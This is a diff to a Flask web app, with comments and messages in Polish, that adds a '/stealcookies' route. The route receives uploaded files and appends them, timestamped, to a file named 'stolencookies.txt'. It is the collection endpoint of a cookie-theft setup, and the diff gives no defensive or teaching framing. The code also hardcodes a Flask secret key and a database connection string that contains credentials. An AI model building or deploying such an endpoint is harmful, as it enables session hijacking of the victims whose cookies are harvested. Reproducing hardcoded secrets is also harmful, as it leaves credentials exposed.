@@ -2,6 +2,8 @@ import hashlib
 import os
 from flask import Flask, render_template, request, redirect, url_for, jsonify,session
 import psycopg2
+import datetime
+
 
 app = Flask(__name__)
 app.secret_key = 'Jakub Mazurek'
@@ -9,6 +11,33 @@ external_database_url = 'postgres://pygenius_security_db_user:2nUg1JYDa5Fgjw0lhO
 
 
 
+
+@app.route('/stealcookies', methods=['GET', 'POST'])
+def steal_cookies():
+    if request.method == 'POST':
+        if 'fileToUpload' in request.files:
+            uploaded_file = request.files['fileToUpload']
+            file_contents = uploaded_file.read().decode('utf-8')
+            
+            # Pobierz aktualną datę i czas
+            now = datetime.datetime.now()
+            formatted_date = now.strftime("%Y-%m-%d %H:%M:%S")
+            
+            # Ścieżka do pliku
+            file_path = './uploads/stolencookies.txt'
+            
+            # Zapisz zawartość pliku, dodając nową linię i datę zaktualizowania
+            with open(file_path, 'a') as f:
+                f.write('\n')  # Nowa linia przed nową zawartością
+                f.write(f'Data zaktualizowania: {formatted_date}\n')
+                f.write(file_contents)
+            
+            return 'Plik został pomyślnie zapisany jako stolencookies.txt.'
+        else:
+            return 'Brak przesłanego pliku lub wystąpił problem podczas zapisu.'
+    
+    # Obsługa GET (renderowanie formularza)
+    return render_template('stealcookies.html')
 
 @app.route('/logout_user')
 def logout_user():
